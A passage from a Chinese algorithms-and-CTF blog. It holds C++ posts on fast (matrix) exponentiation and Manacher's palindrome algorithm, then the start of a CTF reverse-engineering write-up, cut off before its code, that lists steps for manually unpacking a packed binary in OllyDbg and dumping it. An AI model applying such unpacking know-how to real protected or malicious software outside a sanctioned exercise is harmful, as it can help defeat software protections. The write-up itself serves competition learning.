class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multipicate</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> p[][maxn],<span class="keyword">long</span> <span class="keyword">long</span> b[][maxn])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a[maxn][maxn];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span> a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)<span class="comment">//经典矩阵乘法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j]+=(p[i][k]*b[k][j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        p[i][j]=a[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> p[][maxn],<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> base[maxn][maxn];<span class="comment">//复制</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         base[i][j]=p[i][j];</span><br><span class="line">         <span class="keyword">if</span>(i==j)</span><br><span class="line">            p[i][j]=<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            p[i][j]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//快速幂</span></span><br><span class="line">    <span class="keyword">while</span>(m!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>)</span><br><span class="line">             multipicate(p,base);<span class="comment">//s=s*base;</span></span><br><span class="line">        multipicate(base,base);</span><br><span class="line">        m/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> s[maxn][maxn];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入方阵规模和乘方规模: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"收入方阵数据: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">clock_t</span> start,end1;</span><br><span class="line">    start=clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">    quick(s,m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"结果是: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;s[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"时间"</span>&lt;&lt;((clock()-start)/CLOCKS_PER_SEC)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>一、快速幂，作为一种求幂次方的高效算法，经常用在各种比赛题目中。以前也碰到过，实践起来也不难，但总会记不清，特此做一下记录。</p>
<p>原理基础篇：</p>
<p>首先，快速幂的思想方法是什么？</p>
<p>没错，是二进制。就我来看，它应用二进制的原理大概可以做出如下简述：</p>
<p>1.首先我们知道，任何一个数都可以表示成二进制（计算机就是如此）。这个事实就提供了一种思路：将n次幂表示为二进制数。例如，n=13,二进制是1101。这样的话，n=8+4+1；实现了将n 分解成可由2的幂级数的和（也就是原m^n分解为乘积(n^13=n^8<em>n^4</em>n^1)）;</p>
<p>2.知道了这种应用，就很容易理解为什么快速幂这么快（logn），它的实现，个人理解就是充分利用已知的结论服务下一步操作。比如，当你求出n^4时，你只需一步 n^8=n^4*n^4 即可。</p>
<p>下面给出一个简单的C++模板:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pow</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> n)</span><span class="comment">//返回值类型根据具体问题可变</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> base=a;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>)</span><br><span class="line">            ans*=base;<span class="comment">//当前位置二进制为1，</span></span><br><span class="line">        base*=base;<span class="comment">//实现充分利用已知结果</span></span><br><span class="line">        n/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>拓展篇：</p>
<p>学过线代的都知道怎么求矩阵的乘积，相当的有套路，但是却有显得麻烦。尤其是，当你需要对一个方阵求n次方的时候，绝望的不只是你，可能还有计算机。所以就有了优化策略，这种策略就是快速幂，原理一样，只是需要自己实现一个能完成两个方阵相乘的函数即可。</p>
<p>样例如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multipicate</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> p[][maxn],<span class="keyword">long</span> <span class="keyword">long</span> b[][maxn])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a[maxn][maxn];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span> a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)<span class="comment">//经典矩阵乘法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j]+=(p[i][k]*b[k][j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        p[i][j]=a[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> p[][maxn],<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> base[maxn][maxn];<span class="comment">//复制</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         base[i][j]=p[i][j];</span><br><span class="line">         <span class="keyword">if</span>(i==j)</span><br><span class="line">            p[i][j]=<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            p[i][j]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//快速幂</span></span><br><span class="line">    <span class="keyword">while</span>(m!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>)</span><br><span class="line">             multipicate(p,base);<span class="comment">//s=s*base;</span></span><br><span class="line">        multipicate(base,base);</span><br><span class="line">        m/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> s[maxn][maxn];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入方阵规模和乘方规模: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"收入方阵数据: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">clock_t</span> start,end1;</span><br><span class="line">    start=clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">    quick(s,m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"结果是: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;s[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"时间"</span>&lt;&lt;((clock()-start)/CLOCKS_PER_SEC)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/快速幂总结拓展/" data-id="cjorg7gsi000et0tvcdxuaw8e" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/算法/">算法</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-寻找最长回文子串-马拉车算法" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/寻找最长回文子串-马拉车算法/" class="article-date">
  <time datetime="2018-11-20T16:12:18.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/寻找最长回文子串-马拉车算法/">寻找最长回文子串--马拉车算法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这篇文章算是在CSDN的公众号上看到的一个面试题目的总结与记录。</p>
<p>回文串的定义：满足从左到右的字符序列和从右到左的字符序列相同的字符串就是回文串</p>
<p>一个很经典的问题，判断一个字符串是不是回文串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bool isParamString(string src)</span><br><span class="line">&#123;</span><br><span class="line">    int len = src.length();</span><br><span class="line">    for(int i=0;i&lt;len - i -1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(src[i]!=src[len-i-1])</span><br><span class="line">            return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这个判断是很简单的，时间空间复杂度都是0(N)，完全没问题。</p>
<p>那么，如何在给定的任意字符串中找到最长的回文子串？</p>
<p>不考虑复杂度，很容易想到的就是维护一个</p>
<p>不考虑复杂度，很容易想到的就是遍历字符串，记录以每一个字符为中心的回文串的长度。</p>
<p>时间复杂度0(N^2）,空间复杂度0(N^2);有点难以接受</p>
<p>那么来看看马拉车算法的优化原理；</p>
<p>看一个简单的例子：</p>
<p>eg[9] = “cabadabae”</p>
<table>
<thead>
<tr>
<th>c</th>
<th>a</th>
<th>b</th>
<th>a</th>
<th>d</th>
<th>a</th>
<th>b</th>
<th>a</th>
<th>e</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
</tbody>
</table>
<p>分析</p>
<p>当我们知道1-7位是回文串，1-3位是回文串，很容易推测5-7位是回文串；而不能推测eg[6]的回文串长度，因为对于eg[4]所在的回文串来说，不能判断eg[4]和eg[8]是否相等（没有eg[8]的信息）</p>
<p>启发：维护一个右边界，在右边界以内的可以直接得出结论，否则需要扩展计算。</p>
<p>代码实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//判断是不是回文串</span><br><span class="line">bool isParamString(string src);</span><br><span class="line">//初始化处理串</span><br><span class="line">string firstHandle(string src);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //右边界初始化</span><br><span class="line"></span><br><span class="line">    string src;</span><br><span class="line">    cout&lt;&lt;&quot;输入字符串:&quot;;</span><br><span class="line">    while(cin&gt;&gt;src)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        src=firstHandle(src);</span><br><span class="line">        int len = src.length();</span><br><span class="line">        int rightside= 0;</span><br><span class="line">        //右边界对应的串中心初始化</span><br><span class="line">        int rightsidecenter = 0;</span><br><span class="line">        //最长回文串的中心</span><br><span class="line">        int center = 0;</span><br><span class="line">        //最长回文串的长度右边长度</span><br><span class="line">        int rightHalfLong = 0;</span><br><span class="line">        //目前回文串的最大长度</span><br><span class="line">        int longestHalf = 0;</span><br><span class="line">        //记录以每个字符为中心的回文串的长度</span><br><span class="line">        int *eachHalfLong ;</span><br><span class="line">        eachHalfLong = new int [len];</span><br><span class="line">        for (int i=0;i&lt;len;i++)</span><br><span class="line">            eachHalfLong[i] = 0;</span><br><span class="line">        for(int i=0;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bool needed = true;</span><br><span class="line">            if(rightside &gt; i)</span><br><span class="line">            &#123;</span><br><span class="line">                 //根据回文串的对称性，求得i对应的对称字符</span><br><span class="line">                 int i_middle_index = 2 * rightsidecenter - i;</span><br><span class="line">                 eachHalfLong[i] = eachHalfLong[i_middle_index];</span><br><span class="line"></span><br><span class="line">                //越界,由于超出部分的信息未知，需要扩展处理</span><br><span class="line">                if(i + eachHalfLong[i] &gt; rightside)</span><br><span class="line">                &#123;</span><br><span class="line">                    eachHalfLong[i] = rightside - i;</span><br><span class="line">                &#125;</span><br><span class="line">                //没有越界，无需扩展处理</span><br><span class="line">                if(i + eachHalfLong[i] &lt;= rightside)</span><br><span class="line">                &#123;</span><br><span class="line">                    needed = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if(needed)</span><br><span class="line">            &#123;</span><br><span class="line">                while(i - eachHalfLong[i] -1&gt;=0 &amp;&amp; i + eachHalfLong[i] + 1&lt;len)</span><br><span class="line">                &#123;</span><br><span class="line">                    if(src[i-eachHalfLong[i]-1] == src[i+eachHalfLong[i]+1])</span><br><span class="line">                        eachHalfLong[i]++;</span><br><span class="line">                    else break;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                //更新右边界、右中心点</span><br><span class="line">                rightside = i + eachHalfLong[i];</span><br><span class="line">                rightsidecenter = i;</span><br><span class="line">                if(eachHalfLong[i] &gt; longestHalf)</span><br><span class="line">                &#123;</span><br><span class="line">                    longestHalf = eachHalfLong[i];</span><br><span class="line">                    center = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string result = &quot;&quot;;</span><br><span class="line">        for(int i=center-longestHalf +1;i&lt;=center + longestHalf; i += 2)</span><br><span class="line">        &#123;</span><br><span class="line">            result += src[i];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;&quot;其中最长回文串是: &quot;&lt;&lt;result&lt;&lt;&quot;   长度是: &quot;&lt;&lt;longestHalf&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;&quot;输入字符串:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">bool isParamString(string src)</span><br><span class="line">&#123;</span><br><span class="line">    int len = src.length();</span><br><span class="line">    for(int i=0;i&lt;len - i -1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(src[i]!=src[len-i-1])</span><br><span class="line">            return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">string firstHandle(string src)</span><br><span class="line">&#123;</span><br><span class="line">    string result = &quot;#&quot;;</span><br><span class="line">    int len = src.length();</span><br><span class="line">    for(int i=0;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        result += src[i];</span><br><span class="line">        result += &apos;#&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/寻找最长回文子串-马拉车算法/" data-id="cjorg7grh0009t0tvefmilh5x" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/算法/">算法</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-一次手动脱壳" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/一次手动脱壳/" class="article-date">
  <time datetime="2018-11-20T16:09:53.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/一次手动脱壳/">一次手动脱壳</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这个题目的分值是200，对我来说是个不小的挑战啊。</p>
<p>查了一下壳，没有发现什么</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\1.png" alt=""></p>
<p>真的这么简单？拖入IDA观察：</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\2.png" alt=""></p>
<p>呃呃呃，果然不简单；在IDA里面没有任何函数的痕迹。只有一个.text段。</p>
<p>猜测，应该是加了某种壳对源程序加密过。用OD载入。</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\3.png" alt=""></p>
<p>看到OD的提示，再看到这里的循环pushad，看来应该是有壳，可是工具又查不出来，手动？<br>这时想到了ESP定律，记录个大佬的ESP定律讲解链接：<a href="https://blog.csdn.net/D_R_L_T/article/details/74625872" target="_blank" rel="noopener">https://blog.csdn.net/D_R_L_T/article/details/74625872</a><br>将的很详细具体。<br>我就抱着试一试的态度开始了ESP大法的操作。</p>
<p>1、先F8到pushad下一条指令，找到此时的ESP<br>2、转到ESP地址出的数据，下硬件内存访问断点。<br>3、F9到popad附近<br>4、F8单步寻找popad<br>5、附近找到jmp指令（一般是大的jmp）<br>6、跳过去就是OEP啦</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\4.png" alt=""></p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\5.png" alt=""></p>
<p>嗯哼，接下来就可以用OD的插件Ollydump脱壳dump下来啦：</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\6.png" alt=""></p>
<p>到底是不是呢？我们将dump下来的程序拖进IDA查看，会发现已经建立了函数。</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\7.png" alt=""></p>
<p> 接下来就是F5啦：</p>
<p><img src="F:\blog\source\_posts\一次手动脱壳\8.png" alt=""></p>
<p>对这些函数逐个查看（详细的就不讲了）。</p>
<p>每个函数的功能：<br>sub_4018F0   下载一张图片，得到图片的字节数，返回存储图片数据的缓冲区的首地址。<br>sub_401740    初始化一个byte数组   KEY[264]<br>sub_401800    一个算法，得到与文件等长一段数据存在缓冲区buffer<br>sub_401220    对上述得到的缓冲区的数据进行一个简单的异或</p>
<p>纪录下自己的掉进的坑：在初始化数组时，自己没有注意到移位运算的优先级低于 加减 ，导致得到了乱码，半天才找到错误（长记性）。</p>
<p>附送逆向get的代码（C++）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 